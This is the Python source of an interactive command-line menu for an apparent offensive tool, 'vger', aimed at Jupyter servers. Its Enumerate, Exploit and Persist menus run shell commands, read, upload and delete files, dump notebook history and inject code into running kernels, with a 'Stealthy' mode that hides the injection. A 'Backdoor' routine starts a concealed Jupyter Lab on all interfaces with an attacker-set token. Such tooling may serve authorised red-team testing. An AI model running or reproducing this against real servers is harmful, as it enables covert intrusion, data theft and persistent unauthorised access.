from vger.connection import Connection
import inquirer
from vger.attack import attack_session, run_ephemeral_terminal
import asyncio
import json
import base64


class Menu:
    def __init__(self):
        self.server = None
        self.secret = None
        self.sessions = list()
        self.target = None
        self.connection = None

    def login(self):
        login_questions = [
            inquirer.Text(
                "server",
                message="What is the server hostname?",
                default="http://localhost:8888/",
            ),
            inquirer.Text("secret", message="What is the secret token or password?"),
        ]
        answers = inquirer.prompt(login_questions)
        self.server = answers["server"]
        if self.server[-1] != "/":
            self.server += "/"
        self.secret = answers["secret"]
        try:
            self.connection = Connection(self.server, self.secret)
            self.sessions = self.connection.list_running_jpy_sessions()
        except:
            print("There was a problem connecting to that server. Try again.")
            self.login()

    def menu(self):
        nav_menu = [
            inquirer.List(
                "option",
                message="What would you like to do?",
                choices=[
                    "Reset",
                    "Enumerate",
                    "Exploit",
                    "Persist",
                ],
            )
        ]
        answer = inquirer.prompt(nav_menu)
        match answer["option"]:
            case "Reset":
                self.__init__()
                self.main()
            case "Enumerate":
                self.enumerate()
                self.menu()
            case "Exploit":
                self.exploit()
                self.menu()
            case "Persist":
                self.persist()
                self.menu()

    def enumerate(self):
        enumerate_menu = [
            inquirer.List(
                "option",
                "How would you like to enumerate?",
                choices=[
                    "Run shell command",
                    "List dir or get file",
                    "See running notebooks",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(enumerate_menu)
        match answer["option"]:
            case "Run shell command":
                self.run_in_shell()
                self.enumerate()
            case "List dir or get file":
                self.list_dir()
                self.enumerate()
            case "See running notebooks":
                self.list_notebooks()
                self.enumerate()
            case "Back to main menu":
                self.menu()

    def exploit(self):
        exploit_menu = [
            inquirer.List(
                "option",
                "How would you like to exploit?",
                choices=[
                    "Run shell command",
                    "Upload file",
                    "Delete file",
                    "Attack running notebook",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(exploit_menu)
        match answer["option"]:
            case "Run shell command":
                self.run_in_shell()
                self.exploit()
            case "Upload file":
                self.upload()
                self.exploit()
            case "Delete file":
                self.delete()
                self.exploit()
            case "Attack running notebook":
                session_count = self.pick_target()
                if session_count:
                    self.exploit_attack()
                else:
                    self.connection.con.print("Returning to exploit menu")
                    self.exploit()
            case "Back to main menu":
                self.menu()

    def exploit_attack(self):
        attack_menu = [
            inquirer.List(
                "option",
                "Show history or inject code?",
                choices=[
                    "Show history",
                    "Inject code",
                    "Switch notebook",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        match answer["option"]:
            case "Show history":
                self.dump_history()
                self.exploit_attack()
            case "Inject code":
                self.inject()
                self.exploit_attack()
            case "Switch notebook":
                self.switch_target_notebook()
                self.exploit_attack()
            case "Back to main menu":
                self.menu()

    def persist(self):
        persist_menu = [
            inquirer.List(
                "option",
                "How would you like to establish persistence?",
                choices=[
                    "Run shell command",
                    "Backdoor",
                    "List dir or get file",
                    "Upload file",
                    "Delete file",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(persist_menu)
        match answer["option"]:
            case "Run shell command":
                self.run_in_shell()
                self.persist()
            case "Backdoor":
                self.jupyter_backdoor()
                self.persist()
            case "List dir or get file":
                self.list_dir()
                self.persist()
            case "Upload file":
                self.upload()
                self.persist()
            case "Delete file":
                self.delete()
                self.persist()
            case "Back to main menu":
                self.menu()

    def pick_target(self):
        session_info = dict()
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) == 0:
            self.connection.con.print("No running notebooks to attach to")
        else:
            for s in self.sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                session_info[f"{name:<20} {last_active:<30}"] = s
            select_kernel = [
                inquirer.List(
                    "kernel",
                    message="Which notebook would you like to attach to?",
                    choices=session_info.keys(),
                )
            ]
            answer = inquirer.prompt(select_kernel)
            self.target = session_info[answer["kernel"]]
        return len(self.sessions)

    def inject(self):
        attack_menu = [
            inquirer.List(
                "payload",
                message="Would you like to type your payload or reference an existing .py file?",
                choices=["Type", ".py"],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "Type":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [
                inquirer.Path(
                    "path", "Where is the payload .py? ", path_type=inquirer.Path.FILE
                )
            ]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        silent = [
            inquirer.List(
                "choice",
                message="Would you like show up in the history and modify the execution counter?",
                choices=["Yes (Noisy)", "No (Stealthy)"],
            )
        ]
        answer = inquirer.prompt(silent)
        if "Yes" in answer["choice"]:
            silent = False
        else:
            silent = True
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(self.connection, self.target, payload_str, silent=silent)
        )

    def jupyter_backdoor(self, port=7777, secret=""):
        loop = asyncio.get_event_loop()
        if len(secret) == 0:
            config = [
                inquirer.Text(
                    "port",
                    message="What port do you want your Jupyter Server to run on?",
                ),
                inquirer.Text(
                    "secret",
                    message="What password do you want to use for authentication?",
                ),
            ]
            config = inquirer.prompt(config)
            port = config["port"]
            secret = config["secret"]
        if self.target:
            loop.run_until_complete(
                attack_session(
                    self.connection,
                    self.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.con.print(f"Backdoor established on {port}")
        else:
            print("Target needed for backdoor")
            if self.pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.con.print("Attempting to spawn Jupyter from shell")
                self.connection.con.print("May fail due to missing dependencies")
                self.connection.con.print("Verify success manually")
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    run_ephemeral_terminal(
                        self.connection, launch_jupyter, stdout=False
                    )
                )
                self.connection.con.print(f"Backdoor established on {port}")

    def dump_history(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(
                self.connection,
                self.target,
                f"%history",
                silent=False,
                print_out=False,
                get_hist=True,
            )
        )

    def switch_target_notebook(self):
        self.connection.list_running_jpy_sessions()
        self.pick_target()
        self.exploit_attack()

    def run_in_shell(self):
        code = [inquirer.Text("code", "What shell command would you like to run?")]
        answers = inquirer.prompt(code)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, answers["code"])
        )

    def list_notebooks(self):
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) > 0:
            for s in self.connection.jpy_sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                self.connection.con.print(f"{name:<20} {last_active:<30}" + "\n")
        else:
            self.connection.con.print("No running notebooks")

    def list_dir(self):
        dir = [
            inquirer.Text(
                "dir",
                "What directory would you like to list (relative to the Jupyter directory)?\nYou can also use this to read plaintext files.",
                default="/",
            )
        ]
        answers = inquirer.prompt(dir)
        results = self.connection.list_dir(answers["dir"])
        self.connection.con.print_json(json.dumps(results))

    def upload(self):
        payload = [
            inquirer.Path(
                "path",
                "What file do you want to upload? ",
                path_type=inquirer.Path.FILE,
            )
        ]
        answer = inquirer.prompt(payload)
        file_path = answer["path"].split("? ")[-1]
        with open(file_path, "rb") as f:
            payload = f.read()
            payload = base64.b64encode(payload).decode("utf-8")
        target = [
            inquirer.Text("path", "Where do you want to place the file?", default="/")
        ]
        answer = inquirer.prompt(target)
        data = {
            "content": payload,
            "format": "base64",
            "path": answer["path"],
            "type": "file",
        }
        self.connection.con.print(
            self.connection.upload(answer["path"], json.dumps(data))
        )

    def delete(self):
        target = [inquirer.Text("path", "What file do you want to delete?")]
        answer = inquirer.prompt(target)
        response = self.connection.delete(answer["path"])
        if response.status_code == 204:
            self.connection.con.print(f"{answer["path"]} deleted successfully")
        else:
            self.connection.con.print(f"Error deleting {answer["path"]}")

    def main(self):
        self.login()
        self.menu()


def cli():
    m = Menu()
    m.main()


if __name__ == "__main__":
    m = Menu()
    m.main()
